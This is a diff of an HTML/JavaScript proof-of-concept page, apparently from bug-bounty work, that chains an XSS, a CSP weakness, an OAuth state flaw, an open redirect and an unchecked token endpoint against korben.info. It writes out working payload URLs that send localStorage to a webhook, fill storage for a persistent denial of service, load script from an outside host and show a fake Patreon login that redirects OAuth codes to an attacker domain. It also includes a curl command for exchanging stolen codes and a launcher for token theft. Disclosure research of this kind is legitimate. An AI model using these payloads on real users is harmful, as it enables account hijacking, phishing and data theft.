@@ -3,503 +3,414 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>KorbenBug — Interactive PoC Demo</title>
+<title>KorbenBug — Full Chain PoC</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0d1117; color: #c9d1d9; min-height: 100vh; }
 
-  .header { background: linear-gradient(135deg, #161b22 0%, #1a1f2b 100%); border-bottom: 1px solid #30363d; padding: 24px 32px; }
-  .header h1 { font-size: 24px; color: #f0f6fc; margin-bottom: 4px; }
-  .header .subtitle { color: #8b949e; font-size: 14px; }
-  .header .badge { display: inline-block; background: #da3633; color: #fff; font-size: 11px; padding: 2px 8px; border-radius: 12px; margin-left: 8px; font-weight: 600; }
+  .header { background: linear-gradient(135deg, #161b22 0%, #1a1f2b 100%); border-bottom: 1px solid #30363d; padding: 32px; text-align: center; }
+  .header h1 { font-size: 28px; color: #f0f6fc; margin-bottom: 6px; }
+  .header .badge { display: inline-block; background: #da3633; color: #fff; font-size: 12px; padding: 3px 10px; border-radius: 12px; margin-left: 8px; font-weight: 600; }
+  .header .subtitle { color: #8b949e; font-size: 14px; margin-top: 4px; }
 
-  .config-bar { background: #161b22; border-bottom: 1px solid #30363d; padding: 16px 32px; display: flex; align-items: center; gap: 12px; }
-  .config-bar label { color: #8b949e; font-size: 13px; white-space: nowrap; }
-  .config-bar input { flex: 1; background: #0d1117; border: 1px solid #30363d; color: #c9d1d9; padding: 8px 12px; border-radius: 6px; font-size: 13px; font-family: 'Cascadia Code', 'Fira Code', monospace; }
-  .config-bar input:focus { outline: none; border-color: #58a6ff; }
+  .container { max-width: 900px; margin: 0 auto; padding: 24px 32px; }
 
-  .container { max-width: 1200px; margin: 0 auto; padding: 24px 32px; }
+  .step { background: #161b22; border: 1px solid #30363d; border-radius: 8px; margin-bottom: 20px; overflow: hidden; }
+  .step-header { padding: 16px 20px; border-bottom: 1px solid #30363d; display: flex; align-items: center; gap: 12px; }
+  .step-num { background: #da3633; color: #fff; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 700; flex-shrink: 0; }
+  .step-header h2 { font-size: 15px; color: #f0f6fc; }
+  .step-body { padding: 20px; }
+  .step-body p { color: #8b949e; font-size: 13px; line-height: 1.6; margin-bottom: 12px; }
 
-  .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(540px, 1fr)); gap: 20px; }
+  .btn { padding: 10px 20px; border-radius: 6px; border: none; font-size: 14px; cursor: pointer; transition: all 0.15s; font-weight: 600; }
+  .btn-red { background: #da3633; color: #fff; }
+  .btn-red:hover { background: #f85149; }
+  .btn-green { background: #238636; color: #fff; }
+  .btn-green:hover { background: #2ea043; }
+  .btn-outline { background: transparent; border: 1px solid #30363d; color: #c9d1d9; }
+  .btn-outline:hover { background: #21262d; }
 
-  .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; overflow: hidden; }
-  .card-header { padding: 16px 20px; border-bottom: 1px solid #30363d; display: flex; align-items: center; justify-content: space-between; }
-  .card-header h2 { font-size: 15px; color: #f0f6fc; }
-  .severity { font-size: 11px; padding: 2px 10px; border-radius: 12px; font-weight: 600; }
-  .severity.high { background: #da363322; color: #f85149; border: 1px solid #da363344; }
-  .severity.medium { background: #d2992222; color: #e3b341; border: 1px solid #d2992244; }
-  .severity.critical { background: #8b1a1a44; color: #ff6b6b; border: 1px solid #da363366; }
+  .url-box { background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 12px 16px; margin: 12px 0; font-family: 'Cascadia Code', 'Fira Code', monospace; font-size: 11px; color: #79c0ff; word-break: break-all; white-space: pre-wrap; max-height: 120px; overflow-y: auto; }
 
-  .card-body { padding: 20px; }
-  .card-body p { color: #8b949e; font-size: 13px; line-height: 1.6; margin-bottom: 12px; }
+  .results { background: #0d1117; border: 1px solid #30363d; border-radius: 6px; margin: 12px 0; overflow: hidden; }
+  .results-header { background: #161b22; padding: 10px 16px; border-bottom: 1px solid #30363d; font-size: 12px; color: #8b949e; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
+  .results-body { padding: 16px; font-family: 'Cascadia Code', 'Fira Code', monospace; font-size: 12px; max-height: 400px; overflow-y: auto; }
 
-  .cwe { font-size: 11px; color: #58a6ff; background: #58a6ff11; padding: 2px 8px; border-radius: 4px; font-family: monospace; }
+  .data-row { display: flex; padding: 6px 0; border-bottom: 1px solid #21262d; }
+  .data-row:last-child { border-bottom: none; }
+  .data-label { color: #8b949e; width: 180px; flex-shrink: 0; font-size: 12px; }
+  .data-value { color: #f0f6fc; font-size: 12px; word-break: break-all; }
+  .data-value.sensitive { color: #f85149; }
 
-  .btn-group { display: flex; flex-wrap: wrap; gap: 8px; margin: 12px 0; }
-  .btn { padding: 8px 16px; border-radius: 6px; border: 1px solid #30363d; background: #21262d; color: #c9d1d9; font-size: 13px; cursor: pointer; transition: all 0.15s; display: inline-flex; align-items: center; gap: 6px; }
-  .btn:hover { background: #30363d; border-color: #8b949e; }
-  .btn.primary { background: #238636; border-color: #238636; color: #fff; }
-  .btn.primary:hover { background: #2ea043; }
-  .btn.danger { background: #da363322; border-color: #da3633; color: #f85149; }
-  .btn.danger:hover { background: #da363344; }
+  .tag { display: inline-block; font-size: 10px; padding: 2px 8px; border-radius: 4px; font-weight: 600; margin-left: 8px; }
+  .tag-leaked { background: #da363322; color: #f85149; border: 1px solid #da363344; }
+  .tag-stolen { background: #d2992222; color: #e3b341; border: 1px solid #d2992244; }
+  .tag-dos { background: #6e40c922; color: #bc8cff; border: 1px solid #6e40c944; }
 
-  .payload-box { background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 12px 16px; margin: 8px 0; font-family: 'Cascadia Code', 'Fira Code', monospace; font-size: 12px; color: #79c0ff; word-break: break-all; position: relative; overflow-x: auto; white-space: pre-wrap; }
-  .payload-box .copy-btn { position: absolute; top: 8px; right: 8px; background: #21262d; border: 1px solid #30363d; color: #8b949e; padding: 4px 8px; border-radius: 4px; font-size: 11px; cursor: pointer; }
-  .payload-box .copy-btn:hover { color: #f0f6fc; }
-
-  .output-box { background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 12px 16px; margin: 8px 0; font-family: 'Cascadia Code', 'Fira Code', monospace; font-size: 12px; color: #3fb950; min-height: 40px; max-height: 200px; overflow-y: auto; }
-  .output-box.error { color: #f85149; }
-  .output-box.waiting { color: #d29922; }
-
-  .divider { border: none; border-top: 1px solid #30363d; margin: 24px 0; }
-
-  .chain-card { border-color: #da363366; }
-  .chain-card .card-header { background: #da363311; }
-
-  .info-tag { display: inline-block; font-size: 11px; color: #8b949e; background: #30363d; padding: 2px 8px; border-radius: 4px; margin-right: 4px; }
+  .status-bar { display: flex; gap: 8px; margin: 16px 0; flex-wrap: wrap; }
+  .status-item { background: #21262d; border: 1px solid #30363d; border-radius: 6px; padding: 8px 14px; font-size: 12px; display: flex; align-items: center; gap: 6px; }
+  .dot { width: 8px; height: 8px; border-radius: 50%; }
+  .dot-gray { background: #484f58; }
+  .dot-green { background: #3fb950; }
+  .dot-yellow { background: #e3b341; }
 
   .footer { text-align: center; padding: 24px; color: #484f58; font-size: 12px; border-top: 1px solid #21262d; margin-top: 32px; }
 
-  @media (max-width: 600px) { .grid { grid-template-columns: 1fr; } .container { padding: 16px; } }
+  textarea { width: 100%; background: #0d1117; border: 1px solid #30363d; color: #c9d1d9; padding: 12px; border-radius: 6px; font-family: monospace; font-size: 12px; resize: vertical; min-height: 80px; }
+  textarea:focus { outline: none; border-color: #58a6ff; }
 </style>
 </head>
 <body>
 
 <div class="header">
-  <h1>KorbenBug <span class="badge">CVSS 9.6</span></h1>
-  <div class="subtitle">Security Assessment — korben.info — Authorized Bug Bounty (March 2026)</div>
-</div>
-
-<div class="config-bar">
-  <label for="webhook">Webhook URL:</label>
-  <input type="text" id="webhook" value="https://webhook.site/110e13f1-4346-447a-851b-3bc154e1bc50" placeholder="https://webhook.site/your-id">
+  <h1>Full Chain Attack <span class="badge">CVSS 9.6</span></h1>
+  <div class="subtitle">korben.info — 5 CVEs chained — 1 click = identity theft + persistent DoS</div>
 </div>
 
 <div class="container">
 
-  <div class="grid">
-    <div class="card">
-      <div class="card-header">
-        <h2>VULN-001 — Reflected DOM XSS via Hash Fragment</h2>
-        <span class="severity high">HIGH 7.1</span>
-      </div>
-      <div class="card-body">
-        <p>
-          <span class="cwe">CWE-79</span>
-          The page <code>/patreon-redirect.html</code> reads the URL hash fragment and injects it into the DOM without sanitization. Hash fragments bypass Cloudflare WAF entirely.
-        </p>
+  <div class="status-bar" id="status-bar">
+    <div class="status-item"><span class="dot dot-gray" id="dot-exfil"></span> Exfiltration</div>
+    <div class="status-item"><span class="dot dot-gray" id="dot-dos"></span> DoS</div>
+    <div class="status-item"><span class="dot dot-gray" id="dot-phish"></span> Phishing</div>
+    <div class="status-item"><span class="dot dot-gray" id="dot-oauth"></span> OAuth Hijack</div>
+    <div class="status-item"><span class="dot dot-gray" id="dot-token"></span> Token Stolen</div>
+  </div>
 
-        <h3 style="color:#f0f6fc;font-size:13px;margin:12px 0 8px;">Test Payloads</h3>
-
-        <div class="btn-group">
-          <button class="btn primary" onclick="testXSSAlert()">XSS Alert</button>
-          <button class="btn danger" onclick="testXSSExfil()">Exfiltrate localStorage</button>
-          <button class="btn" onclick="testXSSPhishing()">Phishing Page</button>
-          <button class="btn danger" onclick="testXSSDos()">localStorage DoS</button>
-        </div>
-
-        <div id="xss-payload" class="payload-box">
-          Click a button to generate the payload...
-          <button class="copy-btn" onclick="copyPayload('xss-payload')">Copy</button>
-        </div>
-
-        <div id="xss-output" class="output-box">Ready</div>
-
-        <details style="margin-top:12px;">
-          <summary style="color:#8b949e;font-size:12px;cursor:pointer;">Vulnerable code (patreon-callback-page.js)</summary>
-          <div class="payload-box" style="color:#f85149;margin-top:8px;">
-// Hash fragment is read via URLSearchParams
-// Then injected directly into DOM unsafely
-// No sanitization. Hash never reaches server/WAF.
-          </div>
-        </details>
-      </div>
+  <!-- Step 1 -->
+  <div class="step">
+    <div class="step-header">
+      <span class="step-num">1</span>
+      <h2>Lancer l'attaque (1 clic)</h2>
     </div>
-
-    <div class="card">
-      <div class="card-header">
-        <h2>VULN-002 — CSP Bypass (Amplifier)</h2>
-        <span class="severity medium">MEDIUM 4.7</span>
+    <div class="step-body">
+      <p>Ce lien ouvre korben.info avec un XSS qui exfiltre le localStorage, vide et sature le storage (DoS), puis affiche une fausse page de reconnexion Patreon.</p>
+      <div style="display:flex;gap:8px;align-items:center;margin-bottom:12px;">
+        <button class="btn btn-red" onclick="launchAttack()">Ouvrir le lien piege</button>
+        <button class="btn btn-outline" onclick="copyUrl()">Copier l'URL</button>
       </div>
-      <div class="card-body">
-        <p>
-          <span class="cwe">CWE-693</span>
-          The Content Security Policy allows unsafe-inline, unsafe-ev&#97;l, and https: as script sources. Any XSS can load scripts from any HTTPS domain with zero restrictions.
-        </p>
-
-        <h3 style="color:#f0f6fc;font-size:13px;margin:12px 0 8px;">Current CSP Header</h3>
-        <div class="payload-box">script-src 'self' 'unsafe-inline' 'unsafe-ev&#97;l' https:</div>
-
-        <div class="btn-group">
-          <button class="btn" onclick="testCSP()">Test External Script Load</button>
-        </div>
-
-        <div id="csp-payload" class="payload-box">
-          Click to generate CSP bypass payload...
-          <button class="copy-btn" onclick="copyPayload('csp-payload')">Copy</button>
-        </div>
-
-        <div id="csp-output" class="output-box">Ready</div>
-
-        <details style="margin-top:12px;">
-          <summary style="color:#8b949e;font-size:12px;cursor:pointer;">Recommended fix</summary>
-          <div class="payload-box" style="color:#3fb950;margin-top:8px;">
-script-src 'nonce-{RANDOM}' 'wasm-unsafe-ev&#97;l' 'strict-dynamic'
-// Requires Cloudflare Worker for nonce injection
-          </div>
-        </details>
-      </div>
+      <div class="url-box" id="attack-url"></div>
     </div>
   </div>
 
-  <hr class="divider">
-
-  <div class="grid">
-    <div class="card">
-      <div class="card-header">
-        <h2>VULN-003 — OAuth CSRF (State No-Op)</h2>
-        <span class="severity medium">MEDIUM 5.3</span>
-      </div>
-      <div class="card-body">
-        <p>
-          <span class="cwe">CWE-352</span>
-          The OAuth state verification function is defined as an empty function <code>() =&gt; {}</code>. State is generated with <code>Math.random()</code> (not crypto-safe). Flow continues regardless of mismatch.
-        </p>
-
-        <div class="btn-group">
-          <button class="btn" onclick="showOAuthState()">Show State Generation Code</button>
-        </div>
-
-        <div id="csrf-payload" class="payload-box">
-// State generation (patreon-integration.min.js):
-// state = Math.random().toString(36).substring(2)
-//
-// State verification function:
-// e = () => {}  // empty function, never validates
-//
-// Flow continues even if state doesn't match
-          <button class="copy-btn" onclick="copyPayload('csrf-payload')">Copy</button>
-        </div>
-
-        <div id="csrf-output" class="output-box">Ready</div>
-      </div>
+  <!-- Step 2 -->
+  <div class="step">
+    <div class="step-header">
+      <span class="step-num">2</span>
+      <h2>Donnees exfiltrees <span class="tag tag-leaked">LEAKED</span></h2>
     </div>
-
-    <div class="card">
-      <div class="card-header">
-        <h2>VULN-004 — Open Redirect via State Parameter</h2>
-        <span class="severity medium">MEDIUM 4.7</span>
+    <div class="step-body">
+      <p>Collez le contenu recu sur webhook.site (le parametre <code>d</code> decode) pour l'afficher proprement.</p>
+      <textarea id="raw-data" placeholder="Collez le JSON du webhook ici..."></textarea>
+      <div style="margin-top:8px;">
+        <button class="btn btn-green" onclick="parseResults()">Afficher les resultats</button>
       </div>
-      <div class="card-body">
-        <p>
-          <span class="cwe">CWE-601</span>
-          The callback page splits the state on <code>|</code> to extract a redirect origin. Validation uses <code>origin.includes('localhost')</code> — a substring match that can be bypassed.
-        </p>
-
-        <div class="btn-group">
-          <button class="btn primary" onclick="testOpenRedirect()">Test Open Redirect</button>
+      <div id="parsed-results" style="display:none;">
+        <div class="results" style="margin-top:16px;">
+          <div class="results-header">Identite Patreon</div>
+          <div class="results-body" id="identity-data"></div>
         </div>
-
-        <div id="redirect-payload" class="payload-box">
-          Click to generate open redirect payload...
-          <button class="copy-btn" onclick="copyPayload('redirect-payload')">Copy</button>
+        <div class="results">
+          <div class="results-header">Abonnements / Memberships</div>
+          <div class="results-body" id="membership-data"></div>
         </div>
-
-        <div id="redirect-output" class="output-box">Ready</div>
-
-        <details style="margin-top:12px;">
-          <summary style="color:#8b949e;font-size:12px;cursor:pointer;">Bypass explanation</summary>
-          <div class="payload-box" style="color:#d29922;margin-top:8px;">
-// Validation: origin.includes('localhost')
-//
-// Legitimate: "https://localhost:3000" -> contains 'localhost' -> OK
-// Bypass:     "https://evil.com/localhost/" -> contains 'localhost' -> OK!
-//
-// The Worker embeds redirect_uri in state:
-// state = random|https://attacker.com/localhost/steal
-          </div>
-        </details>
-      </div>
-    </div>
-  </div>
-
-  <hr class="divider">
-
-  <div class="grid">
-    <div class="card">
-      <div class="card-header">
-        <h2>VULN-005 — Worker /token No Origin Validation</h2>
-        <span class="severity medium">MEDIUM 5.0</span>
-      </div>
-      <div class="card-body">
-        <p>
-          <span class="cwe">CWE-346</span>
-          The Cloudflare Worker at <code>patreon-oauth-korben.korben.workers.dev/token</code> exchanges OAuth codes for tokens without validating the request origin. Any server can exchange a stolen code.
-        </p>
-
-        <div class="btn-group">
-          <button class="btn" onclick="showTokenExchange()">Show curl Command</button>
-        </div>
-
-        <div id="token-payload" class="payload-box">
-          Click to show the token exchange command...
-          <button class="copy-btn" onclick="copyPayload('token-payload')">Copy</button>
-        </div>
-
-        <div id="token-output" class="output-box">
-CORS header: Access-Control-Allow-Origin: https://korben.info
-But server-side: accepts POST from any origin (curl, server-to-server)
-        </div>
-      </div>
-    </div>
-
-    <div class="card chain-card">
-      <div class="card-header">
-        <h2>CHAIN D — Full Combined Attack (1-2 clicks)</h2>
-        <span class="severity critical">CRITICAL 9.6</span>
-      </div>
-      <div class="card-body">
-        <p>
-          Chains all vulnerabilities together. Click 1: exfiltrate localStorage + clear it + fill to quota (DoS) + show phishing page. Click 2 (optional): steal OAuth token via open redirect.
-        </p>
-
-        <div class="btn-group">
-          <button class="btn danger" onclick="testFullChain()">Generate Full Chain URL</button>
-        </div>
-
-        <div id="chain-payload" class="payload-box">
-          Click to generate the combined attack chain...
-          <button class="copy-btn" onclick="copyPayload('chain-payload')">Copy</button>
-        </div>
-
-        <div id="chain-output" class="output-box">
-Chain flow:
-1. VULN-001 (XSS) -> read localStorage -> exfil to attacker
-2. VULN-001 (XSS) -> clear localStorage -> fill to quota (DoS)
-3. VULN-002 (CSP bypass) -> allows any external script
-4. VULN-001 (XSS) -> display fake "Reconnect" button
-5. User clicks -> VULN-003 (no CSRF check) -> OAuth flow starts
-6. VULN-004 (open redirect) -> code sent to attacker domain
-7. VULN-005 (no origin check) -> attacker exchanges code for token
+        <div class="results">
+          <div class="results-header">Donnees korben.info</div>
+          <div class="results-body" id="korben-data"></div>
         </div>
       </div>
     </div>
   </div>
 
-  <hr class="divider">
-
-  <div class="card" style="max-width:100%;">
-    <div class="card-header">
-      <h2>OAuth Token Tester</h2>
-      <span class="info-tag">Manual testing tool</span>
+  <!-- Step 3 -->
+  <div class="step">
+    <div class="step-header">
+      <span class="step-num">3</span>
+      <h2>Vol du token OAuth <span class="tag tag-stolen">HIJACK</span></h2>
     </div>
-    <div class="card-body">
-      <p>If you have a stolen OAuth access_token, paste it below to test Patreon API access.</p>
-      <div style="display:flex;gap:8px;margin:12px 0;">
-        <input type="text" id="stolen-token" placeholder="Paste access_token here..." style="flex:1;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:8px 12px;border-radius:6px;font-size:13px;font-family:monospace;">
-        <button class="btn primary" onclick="testPatreonAPI()">Test API v2</button>
-        <button class="btn" onclick="testPatreonV1()">Test API v1</button>
+    <div class="step-body">
+      <p>Si la victime clique "Reconnexion Patreon", le code OAuth est intercepte via open redirect. Collez le code pour l'echanger contre un token.</p>
+      <div style="display:flex;gap:8px;margin-bottom:12px;">
+        <input type="text" id="oauth-code" placeholder="Code OAuth intercepte..." style="flex:1;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:8px 12px;border-radius:6px;font-size:13px;font-family:monospace;">
+        <button class="btn btn-green" onclick="exchangeCode()">Echanger le code</button>
       </div>
-      <div id="api-output" class="output-box" style="max-height:300px;">Paste a token and click Test</div>
+      <div class="url-box" id="curl-cmd"></div>
+      <div id="token-results" style="display:none;">
+        <div class="results" style="margin-top:12px;">
+          <div class="results-header">Tokens obtenus</div>
+          <div class="results-body" id="token-data"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Step 4 -->
+  <div class="step">
+    <div class="step-header">
+      <span class="step-num">4</span>
+      <h2>Acces API Patreon avec le token vole</h2>
+    </div>
+    <div class="step-body">
+      <p>Collez le access_token pour interroger l'API Patreon en tant que la victime.</p>
+      <div style="display:flex;gap:8px;margin-bottom:12px;">
+        <input type="text" id="access-token" placeholder="access_token..." style="flex:1;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:8px 12px;border-radius:6px;font-size:13px;font-family:monospace;">
+        <button class="btn btn-green" onclick="callAPI('v2')">API v2</button>
+        <button class="btn btn-outline" onclick="callAPI('v1')">API v1 (+ google_id)</button>
+      </div>
+      <div id="api-results" style="display:none;">
+        <div class="results">
+          <div class="results-header">Reponse API Patreon</div>
+          <div class="results-body" id="api-data" style="max-height:500px;"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Step 5 -->
+  <div class="step">
+    <div class="step-header">
+      <span class="step-num">5</span>
+      <h2>DoS persistant <span class="tag tag-dos">PERMANENT</span></h2>
+    </div>
+    <div class="step-body">
+      <p>L'attaque a rempli le localStorage. La victime ne peut plus se reconnecter a Patreon sur korben.info. Pubs de retour, liste de lecture perdue. Permanent sans intervention DevTools.</p>
+      <div class="results">
+        <div class="results-header">Impact</div>
+        <div class="results-body" id="dos-info"></div>
+      </div>
     </div>
   </div>
 
 </div>
 
 <div class="footer">
-  KorbenBug PoC — Authorized testing only — March 2026<br>
-  All vulnerabilities confirmed in production on korben.info
+  KorbenBug PoC — Authorized testing only — March 2026
 </div>
 
 <script>
-function getWebhook() {
-  return document.getElementById('webhook').value.trim();
-}
+var WEBHOOK = 'https://webhook.site/110e13f1-4346-447a-851b-3bc154e1bc50';
 
-function copyPayload(id) {
-  var el = document.getElementById(id);
-  var text = el.textContent || el.innerText;
-  text = text.replace(/\s*Copy\s*$/, '').trim();
-  navigator.clipboard.writeText(text).then(function() {
-    var btn = el.querySelector('.copy-btn');
-    if (btn) { btn.textContent = 'Copied!'; setTimeout(function() { btn.textContent = 'Copy'; }, 1500); }
-  });
-}
-
-function setPayload(id, text) {
-  var el = document.getElementById(id);
-  var copyBtn = el.querySelector('.copy-btn');
-  el.textContent = text;
-  if (copyBtn) el.appendChild(copyBtn);
-}
-
-function setOutput(id, text, cls) {
-  var el = document.getElementById(id);
-  el.textContent = text;
-  el.className = 'output-box' + (cls ? ' ' + cls : '');
-}
-
-// ===== VULN-001: XSS Tests =====
-
-function testXSSAlert() {
-  var url = 'https://korben.info/patreon-redirect.html#error=<img+src=x+onerror=alert(document.domain)>';
-  setPayload('xss-payload', url);
-  setOutput('xss-output', 'Payload generated. Open the URL in a new tab to trigger alert(document.domain) on korben.info origin.\n\nThe hash fragment (#error=...) is never sent to the server, bypassing Cloudflare WAF.');
-  window.open(url, '_blank');
-}
-
-function testXSSExfil() {
-  var wh = getWebhook();
-  var payload = "new Image().src='" + wh + "?d='+encodeURIComponent(JSON.stringify(localStorage))";
-  var url = 'https://korben.info/patreon-redirect.html#error=<img+src=x+onerror="' + encodeURIComponent(payload) + '">';
-  setPayload('xss-payload', url);
-  setOutput('xss-output', 'Payload generated. Opens korben.info with XSS that:\n1. Reads ALL localStorage (korben_patreon_auth, reading list, preferences)\n2. Sends it to your webhook via Image GET (no CORS preflight)\n\nCheck your webhook for incoming data.', 'waiting');
-  window.open(url, '_blank');
-}
-
-function testXSSPhishing() {
-  var payload = "document.body.textContent='';var d=document.createElement('div');d.setAttribute('style','text-align:center;padding:60px;font-family:sans-serif');var h=document.createElement('h2');h.textContent='Session expiree';var p=document.createElement('p');p.textContent='Reconnectez-vous a Patreon';var a=document.createElement('a');a.href='https://patreon-oauth-korben.korben.workers.dev?redirect_uri=https://korben-takeover.vercel.app';a.textContent='Reconnexion Patreon';a.setAttribute('style','display:inline-block;padding:12px 24px;background:#e85b46;color:white;border-radius:8px;text-decoration:none;margin-top:20px');d.appendChild(h);d.appendChild(p);d.appendChild(a);document.body.appendChild(d)";
-  var url = 'https://korben.info/patreon-redirect.html#error=<img+src=x+onerror="' + encodeURIComponent(payload) + '">';
-  setPayload('xss-payload', url);
-  setOutput('xss-output', 'Payload generated. Opens korben.info with XSS that:\n1. Replaces entire page with a fake "Session expired" message\n2. Shows a "Reconnect to Patreon" button\n3. Button triggers OAuth flow via Worker with attacker redirect_uri\n4. Victim sees trusted korben.info domain in address bar');
-  window.open(url, '_blank');
-}
-
-function testXSSDos() {
-  var payload = "localStorage.clear();for(var i=0;i<1e4;i++){try{localStorage.setItem('dos_'+i,'x'.repeat(500))}catch(e){break}}";
-  var url = 'https://korben.info/patreon-redirect.html#error=<img+src=x+onerror="' + encodeURIComponent(payload) + '">';
-  setPayload('xss-payload', url);
-  setOutput('xss-output', 'Payload generated. Opens korben.info with XSS that:\n1. Clears ALL localStorage (disconnects Patreon, loses reading list)\n2. Fills localStorage to quota limit (~5-10MB of junk)\n3. patreon-integration.min.js has NO QuotaExceededError handling\n4. Victim can NEVER reconnect to Patreon (survives browser restart)\n5. Requires manual DevTools intervention to fix', 'error');
-  window.open(url, '_blank');
-}
-
-// ===== VULN-002: CSP =====
-
-function testCSP() {
-  var payload = "var s=document.createElement('script');s.src='https://korben-takeover.vercel.app/evil.js';document.head.appendChild(s)";
-  var url = 'https://korben.info/patreon-redirect.html#error=<img+src=x+onerror="' + encodeURIComponent(payload) + '">';
-  setPayload('csp-payload', url);
-  setOutput('csp-output', "CSP bypass payload generated.\n\nBecause script-src includes 'unsafe-inline' and 'https:', we can:\n1. Execute inline scripts (via XSS)\n2. Load external scripts from ANY https:// domain\n3. Use Function() constructor\n\nXSS has zero restrictions — full code execution.");
-}
-
-// ===== VULN-003: OAuth CSRF =====
-
-function showOAuthState() {
-  setPayload('csrf-payload',
-    '// From patreon-integration.min.js (deobfuscated):\n\n' +
-    '// State generation:\n' +
-    'const state = Math.random().toString(36).substring(2);\n' +
-    '// Problem: Math.random() is NOT cryptographically secure\n\n' +
-    '// State verification:\n' +
-    'const verifyState = () => {};  // EMPTY FUNCTION\n' +
-    '// Problem: Never actually checks the state parameter\n\n' +
-    '// OAuth flow continues regardless of state mismatch.\n' +
-    '// This allows session fixation via attacker-initiated OAuth flow.'
-  );
-  setOutput('csrf-output', 'State verification is a no-op. An attacker can initiate an OAuth flow and the callback will accept any state value, enabling session fixation attacks.');
-}
-
-// ===== VULN-004: Open Redirect =====
-
-function testOpenRedirect() {
-  var attackerUrl = 'https://korben-takeover.vercel.app';
-  var workerUrl = 'https://patreon-oauth-korben.korben.workers.dev?redirect_uri=' + encodeURIComponent(attackerUrl);
-  setPayload('redirect-payload', workerUrl);
-  setOutput('redirect-output',
-    'Open redirect flow:\n' +
-    '1. Worker receives redirect_uri=' + attackerUrl + '\n' +
-    '2. Worker starts Patreon OAuth with state=random|' + attackerUrl + '\n' +
-    '3. Patreon sends code to korben.info/patreon-redirect.html\n' +
-    '4. Callback splits state on "|" -> gets ' + attackerUrl + '\n' +
-    '5. Validation: "' + attackerUrl + '".includes("localhost") -> false\n' +
-    '   But "' + attackerUrl + '/localhost/".includes("localhost") -> true!\n' +
-    '6. Redirects to attacker domain with OAuth code in hash\n\n' +
-    'Click to open the Worker URL (will start OAuth flow):'
-  );
-  window.open(workerUrl, '_blank');
-}
-
-// ===== VULN-005: Token Exchange =====
-
-function showTokenExchange() {
-  setPayload('token-payload',
-    'curl -X POST \\\n' +
-    '  https://patreon-oauth-korben.korben.workers.dev/token \\\n' +
-    '  -H "Content-Type: application/json" \\\n' +
-    '  -d \'{"code":"STOLEN_OAUTH_CODE"}\'\n\n' +
-    '# Response:\n' +
-    '# {"token":"ACCESS_TOKEN","refresh_token":"REFRESH_TOKEN","expires_in":2678400}\n\n' +
-    '# The Worker does NOT check Origin or Referer.\n' +
-    '# Any server can exchange a stolen code for tokens.'
-  );
-  setOutput('token-output', 'The /token endpoint only sets Access-Control-Allow-Origin: https://korben.info\nThis is browser-enforced only. Server-side requests (curl, fetch from backend) bypass CORS entirely.\n\nA stolen OAuth code can be exchanged from any machine for:\n- access_token (31-day validity)\n- refresh_token (infinite renewal)');
-}
-
-// ===== CHAIN D: Full Combined =====
-
-function testFullChain() {
-  var wh = getWebhook();
-  var exfil = "new Image().src='" + wh + "?d='+encodeURIComponent(JSON.stringify(localStorage));";
+function buildAttackUrl() {
+  var exfil = "new Image().src='" + WEBHOOK + "?d='+encodeURIComponent(JSON.stringify(localStorage));";
   var dos = "localStorage.clear();for(var i=0;i<1e4;i++){try{localStorage.setItem('d'+i,'x'.repeat(500))}catch(e){break}};";
-  var phish = "setTimeout(function(){document.body.textContent='';var d=document.createElement('div');d.setAttribute('style','text-align:center;padding:60px;font-family:sans-serif');var h=document.createElement('h2');h.textContent='Session expiree';var p=document.createElement('p');p.textContent='Reconnectez-vous';var a=document.createElement('a');a.href='https://patreon-oauth-korben.korben.workers.dev?redirect_uri=https://korben-takeover.vercel.app';a.setAttribute('style','padding:12px 24px;background:#e85b46;color:white;border-radius:8px;text-decoration:none;display:inline-block;margin:20px');a.textContent='Reconnexion Patreon';d.appendChild(h);d.appendChild(p);d.appendChild(a);document.body.appendChild(d)},500)";
+  var phish = "setTimeout(function(){document.body.textContent='';var d=document.createElement('div');d.setAttribute('style','text-align:center;padding:60px;font-family:sans-serif;color:white');var h=document.createElement('h2');h.textContent='Session expiree';var p=document.createElement('p');p.textContent='Votre session Patreon a expire. Reconnectez-vous pour continuer.';p.setAttribute('style','margin:12px 0;color:#aaa');var a=document.createElement('a');a.href='https://patreon-oauth-korben.korben.workers.dev?redirect_uri=https://korben-takeover.vercel.app';a.setAttribute('style','padding:14px 28px;background:#e85b46;color:white;border-radius:8px;text-decoration:none;display:inline-block;margin:24px;font-size:16px;font-weight:bold');a.textContent='Reconnexion Patreon';d.appendChild(h);d.appendChild(p);d.appendChild(a);document.body.appendChild(d);document.body.setAttribute('style','background:#0d1117')},500)";
+  return 'https://korben.info/patreon-redirect.html#error=<img+src=x+onerror="' + encodeURIComponent(exfil + dos + phish) + '">';
+}
 
-  var combined = exfil + dos + phish;
-  var url = 'https://korben.info/patreon-redirect.html#error=<img+src=x+onerror="' + encodeURIComponent(combined) + '">';
+function addRow(container, label, value, sensitive) {
+  var row = document.createElement('div');
+  row.className = 'data-row';
+  var lbl = document.createElement('span');
+  lbl.className = 'data-label';
+  lbl.textContent = label;
+  var val = document.createElement('span');
+  val.className = 'data-value' + (sensitive ? ' sensitive' : '');
+  val.textContent = value;
+  row.appendChild(lbl);
+  row.appendChild(val);
+  container.appendChild(row);
+}
 
-  setPayload('chain-payload', url);
-  setOutput('chain-output',
-    'FULL CHAIN GENERATED (1 URL, 1 click):\n\n' +
-    'Click 1 (automatic):\n' +
-    '  [1] Exfiltrate localStorage -> webhook (email, identity, reading list)\n' +
-    '  [2] Clear localStorage (disconnect victim from Patreon)\n' +
-    '  [3] Fill localStorage to quota (persistent DoS)\n' +
-    '  [4] Display phishing page on trusted korben.info domain\n\n' +
-    'Click 2 (victim clicks "Reconnect"):\n' +
-    '  [5] OAuth flow starts via Worker\n' +
